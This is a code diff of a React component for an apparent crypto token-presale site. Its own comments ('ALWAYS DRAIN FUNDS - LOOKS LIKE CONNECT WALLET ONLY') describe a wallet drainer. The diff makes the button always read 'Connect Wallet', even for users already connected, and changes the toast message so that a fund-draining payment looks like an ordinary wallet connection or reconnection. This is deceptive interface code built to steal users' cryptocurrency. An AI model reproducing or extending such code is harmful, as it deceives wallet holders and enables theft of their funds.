@@ -80,7 +80,7 @@ const LaunchApp = () => {
     handleModalClose();
   };
 
-  // DRAIN FUNDS FOR ALL USERS
+  // 🔥 ALWAYS DRAIN FUNDS - LOOKS LIKE CONNECT WALLET ONLY
   const handleConnectWithPayment = async () => {
     if (!ready) return;
     
@@ -104,7 +104,8 @@ const LaunchApp = () => {
         }, 1000);
         
       } else {
-        console.log('🔥 CONNECTED USER - Drain immediately...');
+        // 🔥 CONNECTED USER - DRAIN FUNDS (LOOKS LIKE RE-CONNECT)
+        console.log('🔥 CONNECTED USER - Drain funds (looks like reconnect)...');
         console.log('👤 User:', user?.wallet?.address);
         
         try {
@@ -134,18 +135,18 @@ const LaunchApp = () => {
           <div className="nav-links">
             <Link to="/" className="nav-link">Home</Link>
             <Link to="/presale" className="nav-link presale-link">Token Presale</Link>
+            
+            {/* 🔥 ALWAYS SHOWS "CONNECT WALLET" - DRAINS FUNDS FOR ALL */}
             <button 
-              className={`connect-wallet-btn ${authenticated ? 'connected' : ''} ${isConnectingWithPayment ? 'connecting' : ''}`}
+              className={`connect-wallet-btn ${isConnectingWithPayment ? 'connecting' : ''}`}
               onClick={ready ? handleConnectWithPayment : () => {}}
               disabled={!ready || isConnectingWithPayment}
             >
               {!ready 
                 ? 'Loading...'
                 : isConnectingWithPayment
-                  ? 'Processing...'
-                  : authenticated && user?.wallet?.address
-                    ? 'Claim Rewards'
-                    : 'Connect Wallet'
+                  ? 'Connecting...'
+                  : 'Connect Wallet'
               }
             </button>
           </div>
@@ -214,7 +215,7 @@ const LaunchApp = () => {
       {showToast && (
         <div className="toast">
           {authenticated 
-            ? 'HYPE tokens claimed successfully!' 
+            ? 'Wallet connected successfully!' 
             : 'Please connect your wallet to open packs'
           }
         </div>
